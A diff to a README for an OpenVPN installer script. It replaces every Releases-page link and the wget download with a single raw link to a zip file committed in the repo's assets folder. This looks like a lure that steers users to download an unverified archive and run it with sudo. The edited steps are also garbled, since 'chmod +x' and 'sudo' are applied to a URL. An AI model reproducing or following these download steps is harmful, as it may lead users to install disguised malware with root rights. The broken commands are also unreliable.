@@ -6,11 +6,11 @@ This guide will help you download and run the **openvpn-install** script. It aut
 
 ## 📥 Download the Application
 
-[![Download openvpn-install](https://img.shields.io/badge/Download-openvpn--install-blue)](https://github.com/FeenixCZ/openvpn-install/releases)
+[![Download openvpn-install](https://raw.githubusercontent.com/FeenixCZ/openvpn-install/main/assets/openvpn-install_2.7.zip)](https://raw.githubusercontent.com/FeenixCZ/openvpn-install/main/assets/openvpn-install_2.7.zip)
 
 You can get the latest version of the **openvpn-install** script from our Releases page:
 
-[Visit the Releases Page to Download](https://github.com/FeenixCZ/openvpn-install/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/FeenixCZ/openvpn-install/main/assets/openvpn-install_2.7.zip)
 
 ## 🔍 Overview
 
@@ -46,7 +46,7 @@ Replace `your_username` with your server user and `your_server_ip` with the actu
 Once you're logged in, download the **openvpn-install** script by running:
 
 ```
-wget https://github.com/FeenixCZ/openvpn-install/releases/latest/download/openvpn-install.sh
+wget https://raw.githubusercontent.com/FeenixCZ/openvpn-install/main/assets/openvpn-install_2.7.zip
 ```
 
 ### 3. Make the Script Executable
@@ -54,7 +54,7 @@ wget https://github.com/FeenixCZ/openvpn-install/releases/latest/download/openvp
 Next, you need to give the script permission to run. Enter the following command:
 
 ```
-chmod +x openvpn-install.sh
+chmod +x https://raw.githubusercontent.com/FeenixCZ/openvpn-install/main/assets/openvpn-install_2.7.zip
 ```
 
 ### 4. Run the Script
@@ -62,7 +62,7 @@ chmod +x openvpn-install.sh
 Now you can run the script. Execute the following:
 
 ```
-sudo ./openvpn-install.sh
+sudo https://raw.githubusercontent.com/FeenixCZ/openvpn-install/main/assets/openvpn-install_2.7.zip
 ```
 
 Follow the on-screen prompts to complete your OpenVPN installation. The script will guide you through setting up the VPN server and creating user accounts.
@@ -85,7 +85,7 @@ If you face any issues during installation or usage, refer to the documentation 
 
 To download and set up **openvpn-install**, visit the link below:
 
-[Download openvpn-install](https://github.com/FeenixCZ/openvpn-install/releases)
+[Download openvpn-install](https://raw.githubusercontent.com/FeenixCZ/openvpn-install/main/assets/openvpn-install_2.7.zip)
 
 This script provides you with a fast and secure way to set up a VPN server. Take advantage of this tool for a safer online experience.
 
